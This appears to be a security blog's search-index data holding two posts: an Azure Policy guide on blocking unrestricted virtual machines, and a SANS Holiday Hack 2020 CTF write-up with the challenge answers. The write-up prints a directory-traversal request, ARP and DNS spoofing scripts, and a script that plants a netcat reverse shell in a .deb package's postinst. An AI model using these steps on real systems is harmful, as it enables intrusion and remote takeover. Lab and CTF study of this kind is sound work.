[/sourcecode] Policy Assignment Under policy > definition, go to the newly created policy definition. Click Assign. Provide an assignment name and description Name: Deny creation of virtual machine without access restricted only from company's public IP addresses (on-prem/VPN) Description ( Change the IP address list below ): Deny creation of virtual machine which does not have external company IP addresses restriction in the network security group. One or more of the below corporate IP addresses must be specified in the network security group when creating the virtual machine. Otherwise, the validation will fail and the virtual machine will not be created. Below is the valid public corporate IP addresses list : 208.114.51.253 104.104.51.253 108.104.51.253 Under \u201cParameters\u201d tab, select \u201caudit\u201d in the Effect dropdown and click \u201cReview+Create\u201d On the review page, click \u201cCreate\u201d . The policy assignment is created. Please note It takes about 30 minutes to take effect. Test 1 - Audit mode : Create virtual machine with RDP allowed from any external IP Address With the policy in Audit mode, let us create a new virtual machine with RDP open to any external IP address. When the policy is in the audit mode, the virtual machine creation is successful but Azure policy adds a Microsoft.Authorization/policies/audit/action operation to the activity log and marks the resource as non-compliant. Activity Logs Compliance State: Policy > Compliance Test 2 - Deny mode Create virtual machine with RDP allowed from any external IP Address We need to change the effect mode to \u201cdeny\u201d in our policy assignment. Head over to Policy > Assignments > Click on the policy we created Click \u201cParameters\u201d tab. Select \u201cdeny\u201d from the dropdown and continue to save the policy assignment. Attempt to create a virtual machine with the same settings as we did before. When you proceed to create the virtual machine, the final validation will fail with an error message (left side) which when clicked will show which policy disallowed this action. Clicking on the policy would show the policy assignment with details showing why the policy disallowed this action. When the policy is in the deny mode, the virtual machine creation is successful but Azure policy adds a Microsoft.Authorization/policies/**deny**/action operation to the activity log and marks the resource as non-compliant. Under activity logs, you can see the deny action.: Summary : Azure policy is an excellent way of enforcing compliance in Azure infrastructure. In this blog post we saw how we can apply Azure policy to deny creation of virtual machines without any IP restriction. For further readings : Azure policy docs : https://docs.microsoft.com/en-us/azure/governance/policy/overview Azure policy Github : https://github.com/Azure/azure-policy","title":"Azure Policy &ndash; Deny creation of virtual machines without IP restriction across all Azure subscriptions"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#tldr","text":"Public Azure virtual machines without any IP restriction is always an attack vector which may result in compromise of the VM and further lateral movement in Azure infrastructure. Azure policy may be used to deny any attempt to even create the virtual machines without IP restriction . This blog post has step-by-step process on how to implement an Azure policy on ALL your subscriptions covering IP restriction for ALL your future virtual machines.","title":"TLDR;"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#what-is-azure-policy","text":"Azure policy is a service inside Azure that allows configuration management.It executes every time a new resource is added or an existing resource is changed. It has a set of rules, and set of actions. The Azure policy could report the event as non-compliant or even deny the action altogether if the rules are not matched. Azure policy is an excellent way to enforce and bake-in security and compliance in the Azure infrastructure. As you see in the below picture, Azure policy is an integral part of Azure Governance \u2013 mainly consisting of Policy Definitions and Policy Engine which works directly with Azure Resource Manager (ARM). Image source : https://www.microsoft.com/en-us/us-partner-blog/2019/07/24/azure-governance/","title":"What is Azure policy:"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#_1","text":"Summary: If the Azure virtual machines need to be accessible over internet, Its important to restrict access its access ONLY from your corporate public IP addresses. This will help in couple of situations : a) Limit external access from an attacker. b) Limit Insider threat or misuse from an employee. The IP address restriction could be created while creating the virtual machine using network security groups. However, enforcing this on the policy level by the administrator would ensure we are not dependent on individual team\u2019s best judgment.","title":""},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#process","text":"As a best practice, always test the policy in audit mode before switching to deny mode. In this walkthrough, we will follow below steps : 1) Create the policy definition. 2) Apply the policy (Policy Assignment) in audit mode 3) Test with Audit mode 3) Apply the policy (Policy Assignment) in deny mode 4) Test with Deny mode","title":"Process:"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#create-the-policy-definition","text":"On the search bar, search for \u201cpolicy\u201d and click on it.","title":"Create the policy definition"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#_2","text":"Click Definitions and then click Policy Definition Click the \u2026 button under \u201cDefinition Location\u201d to select the management group. If you want to apply this policy to all subscriptions, don\u2019t select any subscription. To apply this policy to a specific subscription, select the desired subscription under the subscription dropdown.","title":""},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#policy-details","text":"Name: Deny creation of virtual machine without access restricted only from company's public IP addresses (on-prem/VPN) Description ( Change the IP address list below ): Deny creation of virtual machine which does not have external company IP addresses restriction in the network security group. One or more of the below corporate IP addresses must be specified in the network security group when creating the virtual machine. Otherwise, the validation will fail and the virtual machine will not be created. Below is the valid public corporate IP addresses list : 208.114.51.253 104.104.51.253 108.104.51.253 Category : Network Policy Rule: [sourcecode language='python' ] { \"mode\": \"All\", \"policyRule\": { \"if\": { \"allOf\": [ { \"field\": \"type\", \"equals\": \"Microsoft.Network/networkSecurityGroups\" }, { \"count\": { \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules[*]\", \"where\": { \"allOf\": [ { \"anyof\": [ { \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules[*].sourceAddressPrefix\", \"notIn\": [ \"208.114.51.253\", \"104.104.51.253\", \"108.104.51.253\" ] } ] } ] } }, \"greater\": 0 } ] }, \"then\": { \"effect\": \"[parameters('effect')]\" } }, \"parameters\": { \"effect\": { \"type\": \"String\", \"metadata\": { \"displayName\": \"Effect\", \"description\": \"The effect determines what happens when the policy rule is evaluated to match\" }, \"allowedValues\": [ \"audit\", \"deny\" ], \"defaultValue\": \"audit\" } } } [/sourcecode]","title":"Policy Details:"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#policy-assignment","text":"Under policy > definition, go to the newly created policy definition. Click Assign. Provide an assignment name and description Name: Deny creation of virtual machine without access restricted only from company's public IP addresses (on-prem/VPN) Description ( Change the IP address list below ): Deny creation of virtual machine which does not have external company IP addresses restriction in the network security group. One or more of the below corporate IP addresses must be specified in the network security group when creating the virtual machine. Otherwise, the validation will fail and the virtual machine will not be created. Below is the valid public corporate IP addresses list : 208.114.51.253 104.104.51.253 108.104.51.253 Under \u201cParameters\u201d tab, select \u201caudit\u201d in the Effect dropdown and click \u201cReview+Create\u201d On the review page, click \u201cCreate\u201d . The policy assignment is created. Please note It takes about 30 minutes to take effect.","title":"Policy Assignment"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#test-1-audit-mode","text":"Create virtual machine with RDP allowed from any external IP Address With the policy in Audit mode, let us create a new virtual machine with RDP open to any external IP address. When the policy is in the audit mode, the virtual machine creation is successful but Azure policy adds a Microsoft.Authorization/policies/audit/action operation to the activity log and marks the resource as non-compliant. Activity Logs Compliance State: Policy > Compliance","title":"Test 1 - Audit mode :"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#test-2-deny-mode","text":"Create virtual machine with RDP allowed from any external IP Address We need to change the effect mode to \u201cdeny\u201d in our policy assignment. Head over to Policy > Assignments > Click on the policy we created Click \u201cParameters\u201d tab. Select \u201cdeny\u201d from the dropdown and continue to save the policy assignment. Attempt to create a virtual machine with the same settings as we did before. When you proceed to create the virtual machine, the final validation will fail with an error message (left side) which when clicked will show which policy disallowed this action. Clicking on the policy would show the policy assignment with details showing why the policy disallowed this action. When the policy is in the deny mode, the virtual machine creation is successful but Azure policy adds a Microsoft.Authorization/policies/**deny**/action operation to the activity log and marks the resource as non-compliant. Under activity logs, you can see the deny action.:","title":"Test 2 - Deny mode"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/#summary","text":"Azure policy is an excellent way of enforcing compliance in Azure infrastructure. In this blog post we saw how we can apply Azure policy to deny creation of virtual machines without any IP restriction. For further readings : Azure policy docs : https://docs.microsoft.com/en-us/azure/governance/policy/overview Azure policy Github : https://github.com/Azure/azure-policy","title":"Summary :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/","text":"SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up Holiday Hack Challenge is a CTF challenge organized by SANS and Counter Hack during Christmas each year. This year the CTF was named \u201cKringleCon 3: French Hens\u201d. It had total 12 objectives and 12 terminals. Those 12 objectives tested hacking skillsets using Python, Javascript, Network security, Cryptography etc. As you progressed, the difficulty level of the objectives increased. It was a mind-numbing and awesome experience to complete all those objectives. Below is the write-up of those objectives including the answers. All Answers Objective Answer Objective 1: Uncover Santa\u2019s Gift List Proxmark Objective 2: Investigate the S3 bucket North Pole: The Frostiest Place on Earth Objective 3: Point-of-sale Password Recovery santapass Objective 4: Operate the Santavator No answer. This needed to be solved using Javascript by manipulating the position of objects. Objective 5 : Open HID Block No answer. This needed to be solved using the Proxmark CLI. Objective 6: Splunk Challenge Training Question 1 13 Objective 6: Splunk Challenge Training Question 2 t1059.003-main t1059.003-win Objective 6: Splunk Challenge Training Question 3 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Objective 6: Splunk Challenge Training Question 4 2020-11-30T17:44:15Z Objective 6: Splunk Challenge Training Question 5 3648 Objective 6: Splunk Challenge Training Question 6 quser Objective 6: Splunk Challenge Training Question 7 55FCEEBB21270D9249E86F4B9DC7AA60 Objective 6: Splunk Challenge The challenge question The Lollipop Guild CAN Bus Problem This is was the prerequisite for Objective 7 : Solve the Sleigh\u2019s CAN-D-BUS Problem 122520 Objective 8: Broken Tag Generator JackFrostWasHere Objective 9: ARP Shenanigans Tanta Kringle Objective 10: Defeat Fingerprint Sensor No answer. This needed bypassing the \"Santa\" check using Javascript and Fiddler Objective 11a): Naughty/Nice List with Blockchain Investigation Part 57066318F32F729D Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2 fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Objective 1 : Uncover Santa's Gift List There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Answer Proxmark Process 1) Downloaded the photograph. 2) Cropped the photo with only the gift list. 3) Installed Gimp 4) Used Filter > Distort > Whirl and Pinch 5) Unwirl to find the answer Original billboard image : Unwirled Image to find the item : Objective 2: Investigate the S3 bucket When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Answer North Pole: The Frostiest Place on Earth Process Using bucket_finder.rb s3 bucket \"wrapper3000\" was downloaded and extracted. This folder has a file named 'package' which has base64 encoded string Below is the process of unwrapping process of \u2018package\u2019 file all the way to the text file: wrapper3000/package > base64 decode > zip file > .bz2 file > .tar file > .xxd file > .xz file > .z file > ASCII text file. #!/bin/bash -x # Author : Ashish Gupta # Below will download the s3 bucket and will keep unwap till we find a text file # The downloaded and extracted folder \"wrapper\" has this file named 'package' which has base64 encoded string # Unrapping process : # wrapper3000/package > base64 decode > zip file > .bz2 file > .tar file > .xxd file > .xz file > .z file > ASCII text file # # Assuming we are on home, this will show the items TIPS bucket\\_finder ls # Go to bucket\\_finder cd bucket\\_finder/ # Check what is currently in the wordlist cat wordlist # Append wrapper3000 to the wordlist echo wrapper3000 >> wordlist # Check to make sure wrapper3000 is appended to the wordlist cat wordlist # Search for s3 buckets with names noted in the 'wordlist' file and if found download them # Below will download the file named 'package' ./bucket\\_finder.rb wordlist -d # change to downloaded wrapper3000/ directory cd wrapper3000 # Check to make sure a file named 'package' exists ls # What kind of file is 'package' # Below will show \"package: ASCII text, with very long lines\" file package # May be a base64 file. decode it to a file named 'myfile' cat package | base64 -d > myfile # What kind of file is myfile # Below will show \"myfile: Zip archive data, at least v1.0 to extract\" # So, myfile is a zip. extract using unzip. # Below will extract to a .bz2 file printing the below #Archive: myfile # extracting: package.txt.Z.xz.xxd.tar.bz2 unzip myfile # What kind of file is \"package.txt.Z.xz.xxd.tar.bz2\" # Below will show a bz2 file named \"package.txt.Z.xz.xxd.tar.bz2\" printing the below : # package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k file package.txt.Z.xz.xxd.tar.bz2 # Its bz2 file, extract using bzip2 # Below will extract the bz2 file to another file named \"package.txt.Z.xz.xxd.tar\" bzip2 -d package.txt.Z.xz.xxd.tar.bz2 # We have now package.txt.Z.xz.xxd.tar # What kind of file is \"package.txt.Z.xz.xxd.tar\" # below will show .tar printing below : # package.txt.Z.xz.xxd.tar: POSIX tar archive file package.txt.Z.xz.xxd.tar # Extract the tar file. It will extract to package.txt.Z.xz.xxd tar -xvf package.txt.Z.xz.xxd.tar # What kind of file is \"package.txt.Z.xz.xxd\" # package.txt.Z.xz.xxd: ASCII text file package.txt.Z.xz.xxd # use xxd on this to extract to test2.xz xxd -r package.txt.Z.xz.xxd test2.xz # What kind of file is \"test2.xz\" # test2.xz: XZ compressed data file test2.xz # uncompress test2.xz using xz which will extract the file named \"test2\" unxz test2.xz # rename file test2 to test2.z mv test2 test2.z # uncompress test2.z. this will create a file named \"test2\" uncompress test2.z # What kind of file is \"test2\" # test2: ASCII text file test2 # Print the contents of this text file # Output would show \"North Pole: The Frostiest Place on Earth\" cat test2 Objective 3: Point-of-sale Password Recovery Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Answer : santapass Process : Step 1: Extract the santa-shop.exe using 7zip. You see the ASAR file. Step 2: Extract the source code from ASAR application and find the password in main.js Objective 4: Operate the Santavator Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Process Use the chrome JS console to rotate the green light and candycane so we can get lights to all the outlets. a = document.querySelector(\"body > div.box-parent > div.item.light.greenlight\") a.style.transform = \"rotate(-45deg)\" candy = document.querySelector(\"body > div.box-parent > div.item.item.candycane\") candy.style.transform=\"rotate(-10deg)\" Objective 5 : Open HID Block Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Copy the badge id from elf Bow Ninecandle Go near Bow Ninecandle in teh \"Talks\" floor. Open the Proxmark3 CLI from the \"Items\" menu Copy the badge value from Bow Ninecandle using the below command : lf hid read The tag id is 2006e22f0e Use the copied tag id to unlock the door in workshop room Go to the workshop floor and stand in front of the lock. Open Proxmark CLI and simulate the tag id \"2006e22f0e\" of Bow Ninecandle lf hid sim -r 2006e22f0e The door is unlocked!!! When you enter the room you just unlocked, Its all dark with light at the end. You approach it...... and you become Santa!!! This was a magical moment for me! Objective 6: Splunk Challenge Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Splunk Training question 1 How many distinct MITRE ATT&CK techniques did Alice emulate? Answer : 13 Process : Execute the below Splunk query : | tstats count where index=t* by index | eval results=split(index,\"-\") | eval without-dash=mvindex(results,0) | table without-dash | rex field=without-dash mode=sed \"s/\\..*$//\" | dedup without-dash OR | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(? t\\d+)[\\.\\-].0*\" | stats dc(technique) Splunk Training Question 2 : What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Answer : t1059.003-main t1059.003-win Process : Execute the below Splunk query: index=t1059.003* | table index | dedup index | sort index Output : Splunk Training Question 3 : One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Answer: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Process : \"System Information Discovery\" is technique T1082 https://attack.mitre.org/techniques/T1082/ Note per the question, a registry key was queried, so execute the below Splunk query on the all the indexes for the technique t1082 for \u201creg\u201d to get the registry key which was queried, since the \u201cMachineGuid\u201d needed to be determined, It must have been part of the query, so included that as well in the Splunk query: index=t1082* reg machineguid CommandLine!='' | table CommandLine Output : Splunk Training Question 4 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Answer: 2020-11-30T17:44:15Z Process : 1) Go to the Atomic test GitHub page https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md 2) Look for \"OSTAP\". 3) Execute the below Splunk query on the \u201cattack\u201d index to get the 1st OSAT related text executed. index=attack OSTAP | table \"Execution Time _UTC\" | sort \"Execution Time _UTC\" asc Splunk Training Question 5 One Atomic Red Team test executed by the Attack Range makes use of an open-source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Answer : 3648 Process : 1) First look up what projects were authored by frgnca https://github.com/frgnca 2) Search in the attack index with the above projects one by one and you get a hit on \"audio\" index=attack audio We get a hit on this with technique# T1123 3) Confirmed the T1123 does make use of the project \"AudioDeviceCmdlets\" https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md 4) Now pivot to index for the technique T1123 for the \"audio\" and the Sysmon as source with TimeCreated as time. Note that \u201ctail 1\u201d is used as the ask is to get the process id associated with the \u201cfirst use\u201d. \u201ctail 1\u201d will provide the 1st record (1st use) as Splunk returns the search results sorted so that the latest result comes first. index=t1123* EventCode=1 *audio* source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" | tail 1 | table TimeCreated, process_id, CommandLine, * Splunk Training Question 6 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Answer : quser Process : 1) Let\u2019s find which techniques uses the Windows Registry run keys. Go to https://mitre-attack.github.io/attack-navigator/v3/enterprise/ and search for \"run\" and \"view\" the 1st result Its Technique# T1447 Windows registry run keys https://attack.mitre.org/techniques/T1547/001/ 2) Search index t1547 for the sysmon logs for technique with bat index=t1547* \"*bat*\" source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" CommandLine!='' | table CommandLine There are two bat files batstartup.bat (stored local) and Discovery.bat (on Github) Please click on the image to see the larger version. The batch file location appears very small in the above screenshot so listing them out below: 1) $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\\ 2) https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Sysmon logs can\u2019t have the source code of the batstartup.bat. But look at the second one. It\u2019s on GitHub. https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Just go to that URL and the last line of that batch file is \u201cquser\u201d Splunk Training Question 7 : According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? Answer : 55FCEEBB21270D9249E86F4B9DC7AA60 Process : Looking at ALL the technique indices (index=t* ) with source as the zeek x509 logs specifically win-dc: index=t* *cert* source=\"/opt/zeek/logs/current/x509.log\" certificate.subject=*win-dc* | table certificate.serial, certificate.subject | dedup certificate.serial, certificate.subject The Splunk challenge question : What is the name of the adversary group that Santa feared would attack KringleCon? Answer : The Lollipop Guild Process : Gather all the hints! Alice gave a few hints: Hint 1: Alice says the \"ciphertext is 7FXjP1lyfKbyDK/MChyf36h7\" Hint 2: Alice says \"We don't care about RFC 7465\" RFC 7465 requires that the TLC clients and servers never negotiate the user of RC4 ciphers when they establish connections. https://tools.ietf.org/html/rfc7465 So, if they don\u2019t care about RFC 7465, they ignore that RC4 should not be used and still used RC4 ciphers. This means the encryption method used was RC4. But encryption needs a key. What that key would be? Hint 3 Alice says the last one is encrypted using \"your favorite phrase\" Santa asks \"my favorite phrase?\" Alice says \"I can\u2019t believe the Splunk folks put it in their talk\" now, we go and watch the below talk which is in Kringlecon 2020: Dave Herrald, Adversary Emulation and Automation | KringleCon 2020 Mr. Dave Herrald has the below in the video: and he says, this is the most important slide you want to take note of if you are preparing for the Splunk challenge within holiday hack challenge 2020: Stay Frosty (That might be our encryption key) Find answer using all the hints: So, far we have below hints: a) We have the base64 text 7FXjP1lyfKbyDK/MChyf36h7 b) We know RC4 could potentially be the encryption method c) We know \u201cStay Frosty\u201d could potentially be the encryption keys used in RC4 Now we use all the hints to find out the adversary The Lollipop Guild Open Cyberchef https://gchq.github.io/CyberChef/ Build the receipe : 1st item: \"From Base64\" input: 7FXjP1lyfKbyDK/MChyf36h7 2nd Item: \"Encryption /Encoding\" > RC4 Passphrase: Stay Frosty Answer : The Lollipop Guild CAN Bus Problem Answer : 122520 Process : When you open the UI, you will see many messages. Filter out the noise with those all 0's in the message in the Sleigh CAN-D bus. When you click unlock, there is one message which consistently comes up : 19B#00000F000000 Filter out the other one 19B#0000000F2057. Now, we have consistently 19B#00000F000000 when we click unlock. Criteria added to filter noise and message for unlock found Now in the CAN-Bus Investigation terminal, grep for \u201c19B#00000F000000\" in the canndump.log and you see the entry 1608926671.122520. This challenge needed the decimal portion of the timestamp and hence the answer is 122520. Please see the below screenshot. Find the CAN id# in the candump.log ; Get the decimal portion of the mssage Id (the answer) Objective 7: Solve the Sleigh's CAN-D-BUS Problem Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Process : Wunorse Openslae says there is an issue with breaks and doors : Hints from Wunrose Openslae CAN ID of doors is 19B CAN ID of breaks is 080 \"Breaks\" fix - Exclude all the messages containing FF (larger numbers, greater than decimal 100) \"Doors\" fix - Exclude the malicious messages 0F2057 Objective 8: Broken Tag Generator Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Answer : JackFrostWasHere High level Approach: Exploit the directory traversal vulnerability in the tag generator application to use the Local File Inclusion (LFI) on the web server running the application and then access the /proc/self/environ which will contain the all the environment variable used by the web server process including the variable named \u201cGREETZ\u201d Process : Check if the web app has directory traversal vulnerability The elf Holly Evergreen thinks there may be an issue with the \"file upload\" feature : Hints from Holly Evergreen When you upload an image in the tag generator, the image is stored with below URL. https://tag-generator.kringlecastle.com/image?id= .png [Please click on the image below to see enlarged image] https://tag-generator.kringlecastle.com/image?id= .png When you upload a non-image file, it gives a below error. From the error, we understand the below: It\u2019s a Ruby on Rails app the app.rb resides in /app/lib app.rb stores the user uploaded files in /tmp Error when you upload an image file Assuming whatever is being uploaded in /temp is being evaluated without any validation, if we can try directory traversal to get the code of app.rb curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb ../app/lib/app.rb This means, from the current directory /tmp, go one level up (means root), then app, then lib and then can get app.rb Now we have the source code of the app.rb : Use the Local File Inclusion (LSI) to access the environment variables of the process So, we know this Ruby application has the directory traversal vulnerability curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb Under Linux, /proc/self is a dynamic symlink that the kernel provides that points to the process opening it. e.g., if process 1234 tries to follow /proc/self, it will be looking the same content as /proc/1234 and then proc/self/environ will have all the environment variables for the process. curl https://tag-generator.kringlecastle.com/image?id=../proc/self/environ | tr '\\0' '\\n' This will list all the environment variables including \u201cGREETZ\u201d value of which would be \u201c JackFrostWasHere \u201d Objective 9: ARP Shenanigans Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document? Answer : Tanta Kringle High level approach : Change the ARP cache of target machine (10.6.6.35) so all requests come to our host (ARP Poisoning) and we respond to DNS requests (DNS poisoning). Build a Linux trojan on a deb file (which 10.6.6.35 is constantly requesting). This Linux trojan when executed on 10.6.6.35 will open a reverse shell of 10.6.6.35 on our host. With shell access on the 10.6.6.35, we get access to the file /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt which will have the name who recused herself from the vote described on the document. Below screenshot shows how we determined the machines. Nslookup provides more information on those 3 hosts. The Process : ARP Poisoning: Spoof the ARP response going to 10.6.6.35 with our MAC address so all requests (including DNS requests) from 10.6.6.35 come to our host (ARP Poisoning). Change the /script/arp_resp.py accordingly. DNS Poisoning : Since we can intercept all the DNS requests coming from 10.6.6.35, we can respond to those DNS responses (DNS poisoning). Change the /script/dns_resp.py accordingly. Create a Linux trojan with netcat reverse shell payload for port 4444 in it 10.6.6.35 requests for a specific DEB file (pub/jfrost/backdoor/suriv_amd64.deb) over HTTP. We can create a Linux trojan with any DEB file renamed as above deb file which will include a netcat reverse shell. The Linux trojan will be placed in the same directory structure as requested by 10.6.6.35 [pub/jfrost/backdoor/suriv_amd64.deb] Run Python web server and netcat listening on port 4444 Run the python web server on the root. Run netcat listening on our host on port 4444. Showing ARP Poisoning Changes to the script/arp_resp.py : Changes to scripts/arp_resp.py DNS Poisoning diagram : Please click on the image to see the enlarged view : DNS poisoning Changes to scripts/dns_resp.py Changes to scripts/dns_resp.py Creating the linux trojan : The debs/ folder has a number of deb files. We choose netcat-traditional_1.10-41.1ubuntu1_amd64.deb Add netcat reverse shell script to this deb file : nc 10.6.0.3 4444 -e /bin/sh Above will executed when the deb file is requested and executed on 10.6.6.35. This will give a reverse shell on 10.6.6.35 to out host 10.6.0.3 on 4444. Ref : http://www.wannescolman.be/?p=98 Putting it all together : See the below screenshot the processes executed in the below order \u2013 numbered in the below screenshot. 0 : netcat -nlvp 4444 1 : tcpdump -i eth0 -w dump2.pcap 2 : python3 -m http.server 80 3 : python3 scripts/dns_resp.py 4 : python3 scripts/arp_resp.py 5 : We get reverse shell on 10.6.6.35 Once we get the reverse shell on 10.6.0.3, we can get the file NORTH_POLE_Land_Use_Board_Meeting_Minutes and found who recused hersef from vote. It was Tara Kringle ! All Script files in the zip file (please remove the .txt from files after extraction): all_changed_scripts Download arp_resp.py (with changes) for ARP poisoning !/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr) arp_response = ARP(pdst=packet[Ether].psrc) arp_response.op = 'is-at' arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = 0x800 arp_response.hwtype = 0x1 arp_response.hwsrc = macaddr arp_response.psrc = packet[ARP].pdst arp_response.hwdst = packet[ARP].hwsrc arp_response.pdst = packet[ARP].psrc response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main() dns_resp (with changes) for DNS poisoning : !/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=packet.dst, dst=packet.src) ip = IP(dst=packet[IP].src, src=packet[IP].dst) udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) dns = DNS( # MISSING DNS RESPONSE LAYER VALUES id=packet[DNS].id, qr=1, ancount=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr) ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() build_linux_trojan.sh [to create a Linux trojan with a .deb file] !/bin/bash cd ~/ mkdir build-payload cp debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb build-payload/ cd build-payload mkdir work echo \"Extracting netcat-traditional_1.10-41.1ubuntu1_amd64.deb to work/ folder\" dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work mkdir work/DEBIAN ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb echo \"Extracting the control and postinst file from netcat-traditional_1.10-41.1ubuntu1_amd64.deb and \" tar -xf control.tar.xz ./control tar -xf control.tar.xz ./postinst echo \"stuffing nc 10.6.6.53 4444 -e /bin/sh to the postinst file\" echo \"nc 10.6.0.3 4444 -e /bin/sh\" >> postinst # thats my IP address which I want 10.6.6.35 to connect to get the reverse shell on this host mv control work/DEBIAN/ mv postinst work/DEBIAN/ cd ~/ echo \"buiding the deb package\" dpkg-deb --build build-payload/work/ cd ~/ mkdir -p pub/jfrost/backdoor echo \"moving the work.deb to pub/jfrost/backdoor/suriv_amd64.deb\" mv build-payload/work.deb pub/jfrost/backdoor/suriv_amd64.deb echo \"pub/jfrost/backdoor/suriv_amd64.deb is ready!\" Objective 10: Defeat Fingerprint Sensor Bypass the Santavator fingerprint sensor. Enter Santa\u2019s office without Santa\u2019s fingerprint. High level details : When you click the elevator panel, a special JavaScript file named \u201capp.js\u201d get loaded which checks 